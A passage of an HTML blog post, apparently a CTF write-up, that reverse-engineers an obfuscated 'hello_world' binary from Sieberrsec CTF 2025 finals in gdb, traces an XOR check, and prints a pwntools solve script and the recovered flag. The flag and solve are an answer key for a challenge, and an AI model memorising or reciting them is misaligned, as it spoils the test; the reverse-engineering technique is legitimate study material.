+   <span class="mh">0x5555555551bb</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">203</span><span class="o">&gt;:</span>	<span class="n">xchg</span>   <span class="n">rsp</span><span class="p">,</span><span class="n">r14</span>
+   <span class="mh">0x5555555551be</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">206</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x8</span>
+   <span class="mh">0x5555555551c2</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">210</span><span class="o">&gt;:</span>	<span class="n">pop</span>    <span class="n">rax</span>
+   <span class="mh">0x5555555551c3</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">211</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">r8</span><span class="p">,</span><span class="n">r9</span>
+   <span class="mh">0x5555555551c6</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">214</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x5555555551ce</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">222</span><span class="o">&gt;</span>
+   <span class="mh">0x5555555551c8</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">216</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x37</span>
+   <span class="mh">0x5555555551ce</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">222</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="n">rax</span>
+   <span class="mh">0x5555555551cf</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">223</span><span class="o">&gt;:</span>	<span class="n">xchg</span>   <span class="n">rsp</span><span class="p">,</span><span class="n">r14</span>
+   <span class="mh">0x5555555551d2</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">226</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+</code></pre></div></div>
+
+<p>note that when the loop completes, it adds <code class="language-plaintext highlighter-rouge">0x37</code> to <code class="language-plaintext highlighter-rouge">rax</code> and just hits the same <code class="language-plaintext highlighter-rouge">ret</code> instruction that an incomplete loop would hit, so it goes back to that same <code class="language-plaintext highlighter-rouge">libc_start_main</code> trampoline thingy with the exact same state aside from <code class="language-plaintext highlighter-rouge">rax</code> - this means that <code class="language-plaintext highlighter-rouge">rax</code> is somehow used in that trampoline to dictate which block we then go to next.</p>
+
+<p>however it just doesn’t really matter to reverse more of it because we can just.. keep stepping through and seeing which block we hit. :) doing so reveals that our next endpoint just turns out to be the bytes we XOR’d earlier. (r8 is initialized to <code class="language-plaintext highlighter-rouge">0x5555555551e7</code>, and we end up jumping to <code class="language-plaintext highlighter-rouge">0x5555555551e7</code>).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">-&gt;</span> <span class="mh">0x7ffff7c29eb9</span> <span class="n">ff11</span>                  <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0xf9</span><span class="o">&gt;</span>   <span class="n">call</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rcx</span><span class="p">]</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xf7</span><span class="o">&gt;</span>
+
+   <span class="o">-&gt;</span> <span class="mh">0x5555555551e7</span> <span class="mi">4883</span><span class="n">fd02</span>              <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xf7</span><span class="o">&gt;</span>   <span class="n">cmp</span>    <span class="n">rbp</span><span class="p">,</span> <span class="mh">0x2</span>
+      <span class="mh">0x5555555551eb</span> <span class="mi">750</span><span class="n">f</span>                  <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xfb</span><span class="o">&gt;</span>   <span class="n">jne</span>    <span class="mh">0x5555555551fc</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x10c</span><span class="o">&gt;</span>
+      <span class="mh">0x5555555551ed</span> <span class="mi">4</span><span class="n">d8b442408</span>            <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xfd</span><span class="o">&gt;</span>   <span class="n">mov</span>    <span class="n">r8</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">]</span>
+      <span class="mh">0x5555555551f2</span> <span class="mi">4</span><span class="n">c8d0d3f010000</span>        <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x102</span><span class="o">&gt;</span>   <span class="n">lea</span>    <span class="n">r9</span><span class="p">,</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x13f</span><span class="p">]</span> <span class="err">#</span> <span class="mh">0x555555555338</span> <span class="o">&lt;</span><span class="n">frame_dummy</span><span class="o">&gt;</span>
+      <span class="mh">0x5555555551f9</span> <span class="mi">4831</span><span class="n">db</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x109</span><span class="o">&gt;</span>   <span class="n">xor</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">rbx</span>
+      <span class="mh">0x5555555551fc</span> <span class="mi">4</span><span class="n">c87f4</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x10c</span><span class="o">&gt;</span>   <span class="n">xchg</span>   <span class="n">rsp</span><span class="p">,</span> <span class="n">r14</span>
+</code></pre></div></div>
+
+<p>our very first <code class="language-plaintext highlighter-rouge">cmp</code> then dictates where we branch off to, here it’s a compare to <code class="language-plaintext highlighter-rouge">rbp = 0x2</code>. right now our <code class="language-plaintext highlighter-rouge">rbp</code> is <code class="language-plaintext highlighter-rouge">0x1</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">i</span> <span class="n">r</span>
+<span class="n">rax</span>            <span class="mh">0x5555555551e7</span>      <span class="mh">0x5555555551e7</span>
+<span class="n">rbx</span>            <span class="mh">0x555555555489</span>      <span class="mh">0x555555555489</span>
+<span class="n">rcx</span>            <span class="mh">0x5555555570a8</span>      <span class="mh">0x5555555570a8</span>
+<span class="n">rdx</span>            <span class="mh">0x7fffffffdca8</span>      <span class="mh">0x7fffffffdca8</span>
+<span class="n">rsi</span>            <span class="mh">0x7fffffffdc98</span>      <span class="mh">0x7fffffffdc98</span>
+<span class="n">rdi</span>            <span class="mh">0x1</span>                 <span class="mh">0x1</span>
+<span class="n">rbp</span>            <span class="mh">0x1</span>                 <span class="mh">0x1</span>
+</code></pre></div></div>
+
+<p>this means we take the <code class="language-plaintext highlighter-rouge">jne</code> branch, which .. does something, again, with the weird <code class="language-plaintext highlighter-rouge">libc_start_main</code> trampoline, but what is important is we immediately hit a branch that just de-<code class="language-plaintext highlighter-rouge">mprotect</code>s the page and exits out, so that’s no good.</p>
+
+<p>it may be unclear as to how we get <code class="language-plaintext highlighter-rouge">rbp</code> to pass our <code class="language-plaintext highlighter-rouge">0x2</code> check, this just comes down to a knowledge gap: given that we are so early on in the binary (we are in the middle of libc constructor functions that i really have no earthly idea about), <code class="language-plaintext highlighter-rouge">rbp</code> typically holds the number of arguments passed in to stdin.</p>
+
+<p>(this is the one thing i am unclear about as to how you would ‘figure it out’, i knew enough about the challenge that stdin arguments would be involved, so i just guessed. setting $rbp=2 artificially in gdb and stepping through does end in a segfault where you try to access <em>some</em> nullptr that’s near environment variables on the stack, so i suppose that would be a safe guess then. either way…)</p>
+
+<p>armed w/ that knowledge we can just run the binary with a stdin argument and keep on going, we’ll see another strange xor loop in the following block.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">=&gt;</span> <span class="mh">0x55555555521d</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">301</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">dl</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r8</span><span class="p">]</span>
+   <span class="mh">0x555555555220</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">304</span><span class="o">&gt;:</span>	<span class="n">test</span>   <span class="n">dl</span><span class="p">,</span><span class="n">dl</span>
+   <span class="mh">0x555555555222</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">306</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x555555555238</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">328</span><span class="o">&gt;</span>
+   <span class="mh">0x555555555224</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">308</span><span class="o">&gt;:</span>	<span class="n">xor</span>    <span class="n">dl</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r9</span><span class="p">]</span>
+   <span class="mh">0x555555555227</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">311</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r8</span><span class="p">],</span><span class="n">dl</span>
+   <span class="mh">0x55555555522a</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">314</span><span class="o">&gt;:</span>	<span class="n">inc</span>    <span class="n">rbx</span>
+   <span class="mh">0x55555555522d</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">317</span><span class="o">&gt;:</span>	<span class="n">inc</span>    <span class="n">r8</span>
+   <span class="mh">0x555555555230</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">320</span><span class="o">&gt;:</span>	<span class="n">inc</span>    <span class="n">r9</span>
+   <span class="mh">0x555555555233</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">323</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">r14</span><span class="p">,</span><span class="mh">0x8</span>
+   <span class="mh">0x555555555237</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">327</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+</code></pre></div></div>
+
+<p>a few cool things to note here, we load from <code class="language-plaintext highlighter-rouge">r8</code> (a pointer to the argument we pass in via stdin), and we end when the byte we load is null (i.e. the nullterm for whatever string we use as our argument).</p>
+
+<p>we can verify that <code class="language-plaintext highlighter-rouge">r8</code> points to an address on the stack with <code class="language-plaintext highlighter-rouge">vmmap</code>, however we are xoring it with some address in <code class="language-plaintext highlighter-rouge">r9</code>, which is an address in the binary. note that the final destination here is just <code class="language-plaintext highlighter-rouge">r8</code>, meaning that we are xoring the <em>stdin</em> argument in place as it sits on the stack.</p>
+
+<p>also, <code class="language-plaintext highlighter-rouge">$rbx</code> functions as a loop counter. we don’t need a loop counter since we’re using the nullterm of our string as the loop end condition. i am helpfully noting this for later, when this comes up.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">vmmap</span> <span class="err">$</span><span class="n">r8</span>
+<span class="p">[</span> <span class="n">Legend</span><span class="o">:</span> <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="o">|</span> <span class="n">Writable</span> <span class="o">|</span> <span class="n">ReadOnly</span> <span class="o">|</span> <span class="n">None</span> <span class="o">|</span> <span class="n">RWX</span> <span class="p">]</span>
+<span class="n">Start</span>              <span class="n">End</span>                <span class="n">Size</span>               <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
+<span class="mh">0x00007ffffffdd000</span> <span class="mh">0x00007ffffffff000</span> <span class="mh">0x0000000000022000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span> <span class="o">+</span><span class="mh">0x2102d</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">rdx</span><span class="p">,</span> <span class="err">$</span><span class="n">rsp</span><span class="p">,</span> <span class="err">$</span><span class="n">rsi</span><span class="p">,</span> <span class="err">$</span><span class="n">r8</span><span class="p">,</span> <span class="err">$</span><span class="n">r12</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">vmmap</span> <span class="err">$</span><span class="n">r9</span>
+<span class="p">[</span> <span class="n">Legend</span><span class="o">:</span> <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="o">|</span> <span class="n">Writable</span> <span class="o">|</span> <span class="n">ReadOnly</span> <span class="o">|</span> <span class="n">None</span> <span class="o">|</span> <span class="n">RWX</span> <span class="p">]</span>
+<span class="n">Start</span>              <span class="n">End</span>                <span class="n">Size</span>               <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
+<span class="mh">0x0000555555555000</span> <span class="mh">0x0000555555556000</span> <span class="mh">0x0000000000001000</span> <span class="mh">0x0000000000001000</span> <span class="n">rwx</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">upsolves</span><span class="o">/</span><span class="n">Sieberrsec</span><span class="o">-</span><span class="n">CTF</span><span class="o">-</span><span class="mi">2025</span><span class="o">-</span><span class="n">Public</span><span class="o">/</span><span class="n">finals</span><span class="o">/</span><span class="n">re</span><span class="o">/</span><span class="n">hello_world</span><span class="o">/</span><span class="n">dist</span><span class="o">/</span><span class="n">helloworld</span><span class="p">.</span><span class="n">elf</span> <span class="o">+</span><span class="mh">0x338</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">rax</span><span class="p">,</span> <span class="err">$</span><span class="n">rip</span><span class="p">,</span> <span class="err">$</span><span class="n">r9</span><span class="p">,</span> <span class="err">$</span><span class="n">r13</span>
+</code></pre></div></div>
+
+<p>anyways spamming <code class="language-plaintext highlighter-rouge">stepi</code>s gets us to this code block:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="mh">0x55555555528c</span> <span class="mi">4883</span><span class="n">ec08</span>              <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x19c</span><span class="o">&gt;</span>   <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x8</span>
+    <span class="mh">0x555555555290</span> <span class="mi">58</span>                    <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1a0</span><span class="o">&gt;</span>   <span class="n">pop</span>    <span class="n">rax</span>
+ <span class="o">-&gt;</span> <span class="mh">0x555555555291</span> <span class="mi">4883</span><span class="n">fb30</span>              <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1a1</span><span class="o">&gt;</span>   <span class="n">cmp</span>    <span class="n">rbx</span><span class="p">,</span> <span class="mh">0x30</span>
+</code></pre></div></div>
+
+<p>waow. a <code class="language-plaintext highlighter-rouge">cmp rbx, 0x30</code>. as we recall, rbx is just a loop counter, which means that it’s <em>also</em> the number of characters in our input. this means that our input should <em>probably</em> be <code class="language-plaintext highlighter-rouge">0x30</code> bytes long. re-running with <code class="language-plaintext highlighter-rouge">0x30</code> As in the input and once again spamming <code class="language-plaintext highlighter-rouge">stepi</code>s gets us to this block of code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">-&gt;</span> <span class="mh">0x5555555552b2</span> <span class="mi">488</span><span class="n">d3598ffffff</span>        <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1c2</span><span class="o">&gt;</span>   <span class="n">lea</span>    <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0xffffffffffffff98</span><span class="p">]</span> <span class="err">#</span> <span class="mh">0x555555555251</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x161</span><span class="o">&gt;</span>
+    <span class="mh">0x5555555552b9</span> <span class="mi">4</span><span class="n">c87f4</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1c9</span><span class="o">&gt;</span>   <span class="n">xchg</span>   <span class="n">rsp</span><span class="p">,</span> <span class="n">r14</span>
+    <span class="mh">0x5555555552bc</span> <span class="mi">4883</span><span class="n">ec08</span>              <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1cc</span><span class="o">&gt;</span>   <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x8</span>
+    <span class="mh">0x5555555552c0</span> <span class="mi">58</span>                    <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1d0</span><span class="o">&gt;</span>   <span class="n">pop</span>    <span class="n">rax</span>
+    <span class="mh">0x5555555552c1</span> <span class="n">f3a6</span>                  <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1d1</span><span class="o">&gt;</span>   <span class="n">repz</span>   <span class="n">cmps</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsi</span><span class="p">],</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rdi</span><span class="p">]</span>
+    <span class="mh">0x5555555552c3</span> <span class="mi">7408</span>                  <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1d3</span><span class="o">&gt;</span>   <span class="n">je</span>     <span class="mh">0x5555555552cd</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x1dd</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>a <code class="language-plaintext highlighter-rouge">repz cmps</code> of bytes from <code class="language-plaintext highlighter-rouge">[rsi]</code> to <code class="language-plaintext highlighter-rouge">[rdi]</code>. before we do anything let’s just trivially bypass whatever check this is by setting rsi == rdi. doing so reveals that it prints a hidden message here.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">set</span> <span class="err">$</span><span class="n">rsi</span><span class="o">=</span><span class="err">$</span><span class="n">rdi</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+<span class="n">nice</span><span class="o">!</span>
+<span class="n">Hello</span> <span class="n">world</span><span class="o">!</span>
+<span class="p">[</span><span class="n">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="n">process</span> <span class="mi">247098</span><span class="p">)</span> <span class="n">exited</span> <span class="n">normally</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>cool, so our goal should clearly be to pass this check.</p>
+
+<p>we can just verify which two arrays are even being compared by inspecting the values of <code class="language-plaintext highlighter-rouge">$rsi</code> and <code class="language-plaintext highlighter-rouge">$rdi</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">g</span> <span class="err">$</span><span class="n">rsi</span>
+<span class="mh">0x555555555251</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">353</span><span class="o">&gt;:</span>	<span class="mh">0x219be0379c6a6c80</span>	<span class="mh">0x90797c2d3a578bed</span>
+<span class="mh">0x555555555261</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">369</span><span class="o">&gt;:</span>	<span class="mh">0x028698eb2938a09b</span>	<span class="mh">0x32d4d62c398d908a</span>
+<span class="mh">0x555555555271</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">385</span><span class="o">&gt;:</span>	<span class="mh">0xf12b353678c36ebf</span>	<span class="mh">0x7dda959984ae9bf4</span>
+<span class="mh">0x555555555281</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">401</span><span class="o">&gt;:</span>	<span class="mh">0x000a216563696e00</span>	<span class="mh">0x5808ec8348f4874c</span>
+<span class="mh">0x555555555291</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">417</span><span class="o">&gt;:</span>	<span class="mh">0x2d48087430fb8348</span>	<span class="mh">0x054806ebffffff85</span>
+<span class="mh">0x5555555552a1</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">433</span><span class="o">&gt;:</span>	<span class="mh">0xf4874c5000000021</span>	<span class="mh">0x7e8b48d98948fcc3</span>
+<span class="mh">0x5555555552b1</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">449</span><span class="o">&gt;:</span>	<span class="mh">0xffffff98358d4808</span>	<span class="mh">0x5808ec8348f4874c</span>
+<span class="mh">0x5555555552c1</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">465</span><span class="o">&gt;:</span>	<span class="mh">0xffa62d480874a6f3</span>	<span class="mh">0x002e054806ebffff</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">x</span> <span class="err">$</span><span class="n">rdi</span>
+<span class="mh">0x7fffffffdfff</span><span class="o">:</span>	<span class="mh">0x09b5c60dbb5f4eb2</span>	<span class="mh">0xbf5744091949adc2</span>
+<span class="mh">0x7fffffffe00f</span><span class="o">:</span>	<span class="mh">0x1ca8b5c60d11bebe</span>	<span class="mh">0x09a4c80914bebebc</span>
+<span class="mh">0x7fffffffe01f</span><span class="o">:</span>	<span class="mh">0xc80941414de744cc</span>	<span class="mh">0x41f9bebebd8ba986</span>
+<span class="mh">0x7fffffffe02f</span><span class="o">:</span>	<span class="mh">0x45545f5353454c00</span>	<span class="mh">0x65735f5041434d52</span>
+<span class="mh">0x7fffffffe03f</span><span class="o">:</span>	<span class="mh">0x414d006d305b1b3d</span>	<span class="mh">0x2f7261762f3d4c49</span>
+<span class="mh">0x7fffffffe04f</span><span class="o">:</span>	<span class="mh">0x76616e2f6c69616d</span>	<span class="mh">0x6e3d524553550069</span>
+<span class="mh">0x7fffffffe05f</span><span class="o">:</span>	<span class="mh">0x474e414c00697661</span>	<span class="mh">0x006e653d45474155</span>
+<span class="mh">0x7fffffffe06f</span><span class="o">:</span>	<span class="mh">0x5245545f5353454c</span>	<span class="mh">0x3d65755f5041434d</span>
+</code></pre></div></div>
+
+<p>interestingly, note that <code class="language-plaintext highlighter-rouge">rdi</code> is just the address of our xored-in-place stdin input, and <code class="language-plaintext highlighter-rouge">rsi</code> is this array in the binary. recalling our initial xor-loop in the first place, we remember that the xor-key was stored in <code class="language-plaintext highlighter-rouge">r9</code> during that weird code block, so we can just yoink the bytes from there by breakpointing again at that block again.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">g</span> <span class="err">$</span><span class="n">r9</span>
+<span class="mh">0x555555555338</span> <span class="o">&lt;</span><span class="n">frame_dummy</span><span class="o">&gt;:</span>	<span class="mh">0x48f4874cfa1e0ff3</span>	<span class="mh">0xfe1605485808ec83</span>
+<span class="mh">0x555555555348</span> <span class="o">&lt;</span><span class="n">frame_dummy</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="mh">0x5de9f4874c50ffff</span>	<span class="mh">0x48e5894855fffffd</span>
+<span class="mh">0x555555555358</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="mh">0x894800000ca6058d</span>	<span class="mh">0x00b8fffffccae8c7</span>
+<span class="mh">0x555555555368</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="mh">0x000000c35d000000</span>	<span class="mh">0x08ec8348fa1e0ff3</span>
+</code></pre></div></div>
+
+<p>we xor the two bytestrings starting at those addresses to get our flag ^_^</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">xor</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="s">'48f4874cfa1e0ff3fe1605485808ec835de9f4874c50ffff48e5894855fffffd894800000ca6058d00b8fffffccae8c7'</span>
+<span class="n">b</span> <span class="o">=</span> <span class="s">'219be0379c6a6c8090797c2d3a578bed028698eb2938a09b32d4d62c398d908af12b353678c36ebf7dda959984ae9bf4'</span>
+
+<span class="n">z</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">z</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">z</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="n">inals</span><span class="o">/</span><span class="n">re</span><span class="o">/</span><span class="n">hello_world</span><span class="o">/</span><span class="n">dist</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">python</span> <span class="n">solve</span><span class="p">.</span><span class="n">py</span>
+<span class="n">sctf</span><span class="p">{</span><span class="n">going_beyond_hello_world_1z2ket65cx3sdxfjb</span><span class="p">}</span>                                                                                                       
+<span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="n">inals</span><span class="o">/</span><span class="n">re</span><span class="o">/</span><span class="n">hello_world</span><span class="o">/</span><span class="n">dist</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">helloworld</span><span class="p">.</span><span class="n">elf</span> <span class="err">$</span><span class="p">(</span><span class="n">python</span> <span class="n">solve</span><span class="p">.</span><span class="n">py</span><span class="p">)</span>
+<span class="n">nice</span><span class="o">!</span>
+<span class="n">Hello</span> <span class="n">world</span><span class="o">!</span>
+</code></pre></div></div>
+
+<h3 id="closing-1">closing</h3>
+
+<p>the actual obfuscation method used here is very cool, and i would be remiss not to mention <a href="https://blog.elmo.sg/posts/the-art-of-hiding-code-by-modifying-non-volatile-registers">elma’s great writeup</a> on it, so do read that if you want to actually learn what the <code class="language-plaintext highlighter-rouge">libc_start_main</code> trampoline obfuscation nonsense at play here is. the purpose of this writeup is more so to share how a solver wld even go about dealing with this sort of obfuscation.</p>
+
+<p>i think a better, more complete solve would completely unwind the obfuscation and have a nice control flow graph to look at instead of just rawdogging different blocks of asm via eyepower, i did want to learn some more tools / frameworks to get this done (if the binary was even more complicated, tracing manually and haphazardly like this would Not be feasible, you would need a more sophisticated approach. unfortunately this is not a level of sophistication i have :S)</p>
+
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
